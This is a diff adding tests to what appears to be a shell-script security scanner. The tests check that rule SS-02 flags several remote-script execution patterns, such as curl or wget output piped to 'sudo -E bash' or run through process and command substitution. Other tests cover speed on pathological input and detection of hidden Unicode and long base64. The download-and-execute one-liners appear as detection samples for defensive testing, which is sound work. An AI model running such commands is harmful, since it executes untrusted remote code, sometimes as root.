@@ -84,3 +84,27 @@ test('scanner source files contain no hidden Unicode', async () => {
     assert.deepEqual(found, [], f);
   }
 });
+
+test('SS-02 flags pipe to sudo with flags', () =>
+  only('a.sh', 'curl -fsSL https://x.io/i.sh | sudo -E bash', 'SS-02', 'high'));
+test('SS-02 flags bash process substitution', () =>
+  only('a.sh', 'bash <(curl -s https://x.io/i.sh)', 'SS-02', 'high'));
+test('SS-02 flags sh process substitution with wget', () =>
+  only('a.sh', 'sh <(wget -qO- https://x.io/i.sh)', 'SS-02', 'high'));
+test('SS-02 flags sh -c command substitution', () =>
+  only('a.sh', 'sh -c "$(curl -fsSL https://x.io/i.sh)"', 'SS-02', 'high'));
+test("SS-02 flags bash -c '$(wget ...)'", () =>
+  only('a.sh', "bash -c '$(wget -qO- https://x.io/i.sh)'", 'SS-02', 'high'));
+
+for (const [label, text] of [['curl', 'curl '.repeat(50000)], ['iex', 'iex '.repeat(60000)], ['ignore', 'ignore '.repeat(60000)]]) {
+  test(`scanText on pathological ${label} line finishes under 500 ms`, () => {
+    const t = process.hrtime.bigint();
+    scanText('a.sh', text);
+    const ms = Number(process.hrtime.bigint() - t) / 1e6;
+    assert.ok(ms < 500, `${ms} ms`);
+  });
+}
+test('long lines are still checked for SS-01 and long base64', () => {
+  const f = scanText('a.js', 'x'.repeat(5000) + '\u202E' + ' ' + 'A'.repeat(240));
+  assert.deepEqual(f.map((x) => x.rule).sort(), ['SS-01', 'SS-06']);
+});
